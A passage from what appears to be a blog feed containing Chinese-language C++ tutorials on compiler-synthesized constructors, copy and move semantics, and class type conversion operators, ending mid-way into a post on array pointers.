        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在定义一个 C++ 类的时候，编译器会为我们做很多事情，比如在某些情况下会为我们合成各种用于初始化、拷贝、移动、赋值操作的函数。那么 C++ 在定义一个类的时候编译器为我们生成了哪些成员函数呢？直接初始化和拷贝初始化调用的构造函数有什么区别吗？此处设计很多知识点，又杂又乱，所以在文章的开始处，我先把结论列出来。</p><ol><li>编译器可以为我们合成<strong>默认构造函数</strong>、<strong>拷贝构造函数</strong>、<strong>拷贝赋值函数</strong>、<strong>移动构造函数</strong>、<strong>移动赋值函数</strong>、<strong>析构函数</strong>。</li><li>以上提到的由编译器合成的函数，只有在<strong>需要用到他们的时候</strong>，编译器才会为我们创造一个合成的版本。</li><li>直接初始化指的是在定义一个对象时，用形如 <code>int a(0)</code> 的方式进行初始化，拷贝初始化是指在定义对象时用 <code>int a = 0</code> 的方式进行初始化。<strong>所以，直接初始化可能会调用拷贝构造函数，而拷贝初始化受转换构造函数 （转换构造函数是指只接收一个实参的构造函数，这种构造函数可以引起类型转换，建议在阅读本文前先弄清楚类的类型转换问题，可参考文章 C++ 类类型转换）的影响在编译器优化后可能并不会调用拷贝构造函数。</strong></li><li>众所周知，如果类自定义了一个构造函数，则编译器不会再合成一个默认构造函数；拷贝构造函数、拷贝赋值函数和析构函数同理；<strong>但对于移动构造函数和移动赋值函数则不一样，只要类定义了拷贝构造函数或拷贝赋值函数或析构函数，编译器就不会为他合成移动构造函数和移动赋值函数了</strong>。</li><li>一个右值可以赋值给一个右值引用或者一个带 const 修饰的左值引用（目前已经实验过的，是否还可以赋值给更多类型作者也不敢下定论）。</li></ol><hr><h1 id="编译器为我们的类合成了哪些函数？"><a href="#编译器为我们的类合成了哪些函数？" class="headerlink" title="编译器为我们的类合成了哪些函数？"></a>编译器为我们的类合成了哪些函数？</h1><p>直接用 clang 将下述一个简单的类的定义的语法树 dump 出来：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntArray</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> size;</span><br><span class="line">    <span class="keyword">int</span> *ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p><font color=red>可以看到，在语法树中编译器明显的指出编译器可以用来合成的六个函数，<strong>默认构造函数</strong>、<strong>拷贝构造函数</strong>、<strong>拷贝赋值函数</strong>、<strong>移动构造函数</strong>、<strong>移动赋值函数</strong>、<strong>析构函数</strong></font>。但是，在类的定义中，并没有将这个六个函数真正的实现，这是因为并没有用到他们，如果修改我们的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntArray</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> size;</span><br><span class="line">    <span class="keyword">int</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">IntArray <span class="title">getia</span><span class="params">()</span><span class="comment">//该函数因为要释放一个局部对象，所以会使得编译器合成一个析构函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">IntArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IntArray ia1;        <span class="comment">// 该行代码会让编译器合成一个默认构造函数</span></span><br><span class="line"><span class="function">IntArray <span class="title">ia2</span><span class="params">(ia1)</span></span>;    <span class="comment">// 该行代码会让编译器合成一个拷贝构造函数</span></span><br><span class="line">    <span class="function">IntArray <span class="title">ia3</span><span class="params">(getia())</span></span>;  <span class="comment">// 该行代码会让编译器合成一个移动构造函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="2.png"></p><p>显然编译器在类 IntArray 中为代码中使用到的几个函数合成了默认的版本。<font color=red><strong>由此得出结论，只有在需要用到某个可以默认合成的函数时，编译器才会合成它。</strong></font>观察其默认构造函数，为什么编译器合成的默认构造函数什么也没做？？</p><hr><h1 id="对象到底调用了哪个函数？"><a href="#对象到底调用了哪个函数？" class="headerlink" title="对象到底调用了哪个函数？"></a>对象到底调用了哪个函数？</h1><p>扩展我们的类 <strong>IntArray</strong>，为其自定义编译器可以生成的六个函数，以观察我们的对象到底调用了谁，为了屏蔽编译器的优化，加入编译参数 <code>-fno-elide-constructors</code> ，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntArray</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">IntArray</span>() : <span class="built_in">size</span>(<span class="number">0</span>), <span class="built_in">ptr</span>(<span class="literal">nullptr</span>) &#123; cout &lt;&lt; <span class="string">&quot;default constructor!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="comment">// 直接初始化的构造函数，用 explicit 屏蔽了其隐式转换的特性</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">IntArray</span><span class="params">(<span class="keyword">unsigned</span> s)</span> : size(s)</span></span><br><span class="line"><span class="function">    &#123;</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;direct constructor!\n&quot;</span>;</span><br><span class="line">        ptr = <span class="keyword">new</span> <span class="keyword">int</span>[size]&#123;<span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">IntArray</span>(<span class="keyword">const</span> IntArray &amp;I) : <span class="built_in">size</span>(I.size)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy constructor!\n&quot;</span>;</span><br><span class="line">        ptr = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">            ptr[i] = I.ptr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">IntArray</span>(IntArray &amp;&amp;I) : <span class="built_in">size</span>(I.size)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;move constructor!\n&quot;</span>;</span><br><span class="line">        ptr = I.ptr;</span><br><span class="line">        I.ptr = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IntArray &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> IntArray &amp;I)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;I)</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy assignment!\n&quot;</span>;</span><br><span class="line">        size = I.size;</span><br><span class="line">        ptr = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">            ptr[i] = I.ptr[i];</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IntArray &amp;<span class="keyword">operator</span>=(IntArray &amp;&amp;I)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;I)</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;move assignment!\n&quot;</span>;</span><br><span class="line">        size = I.size;</span><br><span class="line">        ptr = I.ptr;</span><br><span class="line">        I.ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">IntArray</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;deconstructor!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">delete</span>[] ptr;</span><br><span class="line">            ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> size;</span><br><span class="line">    <span class="keyword">int</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IntArray ia1;       <span class="comment">// 调用默认构造函数</span></span><br><span class="line">    <span class="function">IntArray <span class="title">ia2</span><span class="params">(ia1)</span></span>;  <span class="comment">// 直接初始化，调用拷贝构造函数</span></span><br><span class="line">    IntArray ia3 = ia1; <span class="comment">// 拷贝初始化，调用拷贝构造函数</span></span><br><span class="line">    IntArray ia4 = <span class="keyword">static_cast</span>&lt;IntArray&gt;(<span class="number">10</span>); <span class="comment">// 拷贝初始化，调用直接构造函数和移动构造函数，如果打开优化则只调用直接构造函数</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    ia1 = ia2;<span class="comment">// 调用拷贝赋值函数</span></span><br><span class="line">    ia1 = <span class="keyword">static_cast</span>&lt;IntArray&gt;(<span class="number">5</span>);<span class="comment">// 调用直接构造函数和移动赋值函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：<br><img src="3.png"></p><p>对于对象 ia1 ，由于没有给定初始值，所以调用了默认构造函数。对于对象 ia2 ，虽然是直接初始化，但是调用了拷贝构造函数，对于对象 ia3 ，采用拷贝初始化调用了拷贝构造函数。对于对象 ia4，由于存在一个显式转换，所以先调用了直接构造函数，导致生成一个临时对象，然后调用移动构造函数。如果打开编译器的优化，则优化掉第二次的移动构造函数的调用。<font color=red><strong>由此可见，直接初始化和拷贝初始化仅仅是一种代码书写的形式，直接初始化有可能会调用拷贝构造函数，而拷贝初始化也有可能不调用拷贝构造函数而调用直接构造函数。</strong></font>对于两次对 ia1 对象的赋值，第一次调用了拷贝赋值函数，第二次赋值则调用了直接构造函数和移动赋值函数，这也是因为直接构造函数生成的临时对象是一个右值的原因，所以导致发生了移动语义。</p><p>如果我们将 IntArray 类中的移动构造函数和移动赋值函数注释掉，则上述 main 函数代码输出如下：<br><img src="4.png"></p><p>由显式转换生成的临时对象匹配到了拷贝构造函数和拷贝赋值函数上去了，而并没有使用编译器合成的移动构造函数和移动赋值函数，为什么？<font color=red><strong>因为类已经定义了拷贝构造函数、拷贝赋值函数和析构函数，所以编译器根本没有合成这两个移动语义的函数</strong></font>。那为什么右值可以匹配到一个带 const 修饰的左值引用呢？我认为是因为移动语义是在 C++11 标准才引入的特性，所以这样做可以兼容 C++11 之前的代码。因此总结，在 C++11 标准出来后，<font color=red><strong>一个右值可以赋值给一个右值引用或者一个带 const 修饰的左值引用</strong></font>。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 类类型转换</title>
      <link href="/2021/10/21/cpp-class-type-cast/"/>
      <url>/2021/10/21/cpp-class-type-cast/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 C++ 中，对于一个类来说，根据接收的参数数量和类型不同，可以定义多个构造函数。如果在创建一个类的对象时，不需要输入任何实参作为初始值，此时调用的是<strong>默认构造函数</strong>。如果将同一个类的另外一个对象作为实参初始值，则调用的称为<strong>拷贝构造函数</strong>。有一种特殊的构造函数，该类构造函数只接收一个实参，他实际上不仅仅实现了一种初始化对象的方式，而且<font color=red>实现了一种转换为此类类型的转换机制</font>，这种构造函数就被称为<strong>转换构造函数</strong>。在使用 C++ 提供的内置类型时，会接触到很多类型转换机制，其实用户自定义的类型也存在转换机制，而此篇文章就主要讨论接收一个参数的转换构造函数，以及其带来的类类型转换机制。同时还对<strong>类型转换运算符</strong>进行讨论，为我们的类自定义转换成其他类型的行为。</p><hr><h1 id="将其他类型转换为类类型"><a href="#将其他类型转换为类类型" class="headerlink" title="将其他类型转换为类类型"></a>将其他类型转换为类类型</h1><p>如下假设我们实现了一个 Person 类，该类有三个构造函数，分别是默认构造函数，接受两个参数 name 和 address 的构造函数，还有接受一个参数 name 的构造函数，对于第三个构造函数，由于其只接收一个构造函数，所以它给 Person 类带来了一种 string 到 Person 的转换机制。代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++环境：gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>() : <span class="built_in">name</span>(<span class="string">&quot;Unknown&quot;</span>), <span class="built_in">address</span>(<span class="string">&quot;Unknown&quot;</span>) &#123; cout &lt;&lt; <span class="string">&quot;default constructor\n&quot;</span>; &#125;;</span><br><span class="line">    <span class="built_in">Person</span>(string n, string addr) : <span class="built_in">name</span>(n), <span class="built_in">address</span>(addr) &#123; cout &lt;&lt; <span class="string">&quot;direct constructor 1\n&quot;</span>; &#125;</span><br><span class="line">    <span class="built_in">Person</span>(string n) : <span class="built_in">name</span>(n), <span class="built_in">address</span>(<span class="string">&quot;Unknown&quot;</span>) &#123; cout &lt;&lt; <span class="string">&quot;direct constructor 2\n&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string name, address;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    Person Alice;</span><br><span class="line">    Alice = name;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：<br><img src="1.png"></p><p>可见，main 函数中的第二行代码，通过默认构造函数初始化一个 Person 对象 Alice。而第三行将一个 string 对象赋值给一个 Person 对象 Alice，按道理来说，两个类型不同的对象是无法赋值的，而此处之所以可以赋值就是因为就发生了<strong>隐式类型转换</strong>，通过转换构造函数 direct constructor 2 ，编译器先调用该构造函数通过 string 对象 name 生成一个 Person 的临时对象，然后将该临时对象赋值给 Alice 对象。如果类设计者需要接收一个参数的构造函数，但同时又不希望向用户提供这种隐式的转换机制应该怎么办呢，<strong>仅仅需要将其构造函数声明成 explicit 即可（C++11）</strong>，用户则不能通过赋值操作来将 string 对象赋值给 Person 对象，如下给转换构造函数 direct constructor 2 加上 explicit 声明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Person</span><span class="params">(string n)</span> : name(n), address(<span class="string">&quot;Unknown&quot;</span>) &#123;</span> cout &lt;&lt; <span class="string">&quot;direct constructor 2\n&quot;</span>; &#125;</span><br></pre></td></tr></table></figure><p>则编译的时候将报错：<br><img src="2.png"></p><p>g++ 显示没有合适的 operator= 函数匹配，其实就是因为没有合适的构造函数将 string 对象转换成 Person 临时对象。</p><blockquote><p>注意，explicit 仅仅屏蔽掉了其隐式转换的属性，此时同样可以使用<strong>显式转换机制</strong>。<br>隐式转换还可以发生在函数返回的时候。</p></blockquote><p>将 main 函数改成如下则可以顺利编译通过：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    Person Alice; </span><br><span class="line">    Alice = <span class="keyword">static_cast</span>&lt;Person&gt;(name);<span class="comment">// 通过static_cast将name显示转换成Person对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="将类类型转换成其他类型"><a href="#将类类型转换成其他类型" class="headerlink" title="将类类型转换成其他类型"></a>将类类型转换成其他类型</h1><p>通过<strong>类型转换运算符</strong>可以将类类型转换到其他的类型，其一般形式：<code>operator type() const</code> ，其中 <em>type</em>表示某种类型。假如我们希望 Person 类提供这样的机制，即我们可以通过其对象就能判断其是否具有名字，此时就需要用到类型转换运算符，将第一小节的代码扩展如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>() : <span class="built_in">name</span>(<span class="string">&quot;Unknown&quot;</span>), <span class="built_in">address</span>(<span class="string">&quot;Unknown&quot;</span>) &#123; cout &lt;&lt; <span class="string">&quot;default constructor\n&quot;</span>; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Person</span><span class="params">(string n, string addr)</span> : name(n), address(addr) &#123;</span> cout &lt;&lt; <span class="string">&quot;direct constructor 1\n&quot;</span>; &#125;</span><br><span class="line">    <span class="built_in">Person</span>(string n) : <span class="built_in">name</span>(n), <span class="built_in">address</span>(<span class="string">&quot;Unknown&quot;</span>) &#123; cout &lt;&lt; <span class="string">&quot;direct constructor 2\n&quot;</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***************************************************************************/</span></span><br><span class="line">    <span class="comment">// 扩展部分</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="built_in">string</span>(<span class="string">&quot;Unknown&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/***************************************************************************/</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string name, address;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    Person Alice;</span><br><span class="line">    Alice = <span class="keyword">static_cast</span>&lt;Person&gt;(name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isAliceHasName = Alice;</span><br><span class="line">    cout &lt;&lt; isAliceHasName &lt;&lt; endl;<span class="comment">//输出为 1</span></span><br><span class="line"></span><br><span class="line">cout &lt;&lt; (Alice &lt;&lt; <span class="number">2</span>) &lt;&lt; endl;<span class="comment">//输出为 4 ,如果将转换成 bool 的类型转换运算符声明为 explicit ，则编译失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在 Person 类中定义个 <code>operator bool() const</code> 类型转换运算符即完成了该操作，在语句<code>bool isAliceHasName = Alice;</code> 中，就调用了成员函数 <code>operator bool() const</code> 发生隐式转换，因为 Alice 对象具有名字（成员变量 name 没被赋值为 “Unknown”），所以返回了 true ，输出为 1。注意该类型转换运算符有几个特点：</p><ul><li>没有显示的返回类型，但是有返回值，且返回值跟 type 必须是同一个类型。</li><li>没有形参。</li><li>必须定义成类的成员函数。</li><li>一般都会用 const 修饰，因为其通常不应该改变待转换对象的内容。</li></ul><p>同样的，这种隐式转换会带来很严重的问题，在上述的 Person 类中，以下代码也能通过编译，<code>Alice &lt;&lt; 2;</code> ，即使我们没有重载 <code>&lt;&lt;</code> 运算符。其能通过编译的原因就是编译器在识别到该行代码时，因为 Alice 对象可以隐式转换成 bool 类型，所以编译器先将其隐式转换成 bool 类型的 true，bool 类型可以进行移位运算，故被编译器进行整型提升后向左移位 2 位，所以输出的就是 4。<strong>显然这种结果是我们及其不愿意看到的，于是在 C++11 标准中，加入了关键字 explicit，将类型转换运算符声明为 explicit ，则可以屏蔽掉隐式转换</strong>。同样，类似于第一小节中的用法，即使屏蔽了隐式转换，仍然可以通过显式转换的方式来进行类型转换。<strong>但是对于类型转换运算符来说，有一个特殊的意外，就是当其被声明为 explicit 的时候，若表达式是被用作条件，则仍然可以发生隐式转换</strong>：</p><ul><li>if 、while 、do 语句的条件部分</li><li>for 语句头的条件表达式</li><li>逻辑非运算符（!）、逻辑或运算符（||）、逻辑与运算符（&amp;&amp;）的运算对象</li><li>条件运算符（ ? : ）的条件表达式</li></ul><p>这就给我们带来了很多方便，比如我们在用 <strong>cin</strong> 作为循环控制的时候，经常会写这种代码：<code>while(std::cin &gt;&gt; value)</code> ，<strong>cin</strong> 在执行完 <strong>&gt;&gt;</strong> 运算后，会返回 <strong>cin</strong> 的引用，此时 <strong>cin</strong> 这个对象本身作为了 <strong>while</strong> 语句的条件判断。我们都知道 <strong>cin</strong> 是一种流对象，为什么这种用户定义的类的对象可以直接作为 <strong>while</strong> 语句的条件判断呢，我们可以深入源代码：<br><img src="3.png"></p><p>可见，在 <strong>cin</strong> 对应的类中，定义了一个转换成 <strong>bool</strong> 类型的类型转换运算符，该运算符就可以通过调用 <strong>fail()</strong> 函数，来判断流在进行输入后，状态是否还是正确的，并将结果返回。同时，其被声明成 <strong>explicit</strong> 来防止被用来作为一般的隐式转换，又因为其可以作为条件判断的特殊性，则可以将 <strong>cin</strong> 对象用于上述所提及的特例中了。</p><blockquote><p>参考资料： 《C++ Prime》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 中数组指针和函数指针</title>
      <link href="/2021/10/21/cpp-array-func-pointer/"/>
      <url>/2021/10/21/cpp-array-func-pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="数组的类型"><a href="#数组的类型" class="headerlink" title="数组的类型"></a>数组的类型</h1><p>在往常的编程中，我们都知道数组的名字就代表数组第一个元素的地址，这总是让我们对数组的类型产生误解。比如对于这条指令 <code>int a[10] = &#123;0&#125;;</code> ，因为当引用数组名 <strong>a</strong> 的时候往往相当于引用数组第一个元素 <strong>a[0]</strong> 的地址，所以我们可能会误认为数组 <strong>a</strong> 的类型是 <code>int *</code>，然而数组名 <strong>a</strong> 代表的却是整个数组，他的类型并不是简单的 <code>int *</code>，那数组 <strong>a</strong> 的类型到底是什么呢？我们都知道一个数组的两个特点是<strong>存储元素的类型</strong>和<strong>数组的大小</strong>，那么很容易的想到数组 <strong>a</strong> 的类型便是 <code>int [10] </code> 啦。对于如下两句代码，我们可以用 clang 生成 AST 观察其类型的特征：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *b = a;</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p>可以看到在第一个 <strong>VarDecl</strong> 节点，明确的指出了数组 <strong>a</strong> 是 <code>int [10]</code> 的类型，而在第二个 <strong>VarDecl</strong> 节点，为了用 <strong>a</strong> 初始化变量 <strong>b</strong> ，首先是通过隐式转换，将 <code>int [10]</code> 类型转换为 <code>int *</code> 后再赋值给变量 <strong>b</strong> ，更进一步说明了数组 <strong>a</strong> 的类型就是 <code>int [10]</code>。由此我们可以总结出任意数组的类型并不简单的就是其元素指针的类型，而是形式于 <code>element-type [array-size]</code> 。</p><hr><h1 id="数组指针怎么写"><a href="#数组指针怎么写" class="headerlink" title="数组指针怎么写"></a>数组指针怎么写</h1><p>既然数组是有其独特的类型的话，那么我们也可以声明且定义一个指向某种数组的指针。如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">// 定义一个包含10个int型元素的数组</span></span><br><span class="line"><span class="keyword">int</span> *p1[<span 